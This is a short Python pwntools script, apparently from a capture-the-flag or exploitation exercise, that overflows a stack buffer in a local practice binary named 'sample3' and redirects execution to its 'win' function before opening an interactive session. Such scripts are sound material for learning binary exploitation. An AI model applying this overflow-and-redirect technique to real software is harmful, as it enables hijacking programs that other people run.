#!/usr/bin/python3

from pwn import *

context.binary = elf = ELF("./sample3", checksec = False)
con = process()
#gdb.attach(con, gdbscript = "start")

ret = 0x0000000000401248

input()
payload = b"A"*0x28 + p64(elf.sym['win']+8)

con.send(payload)
con.interactive()
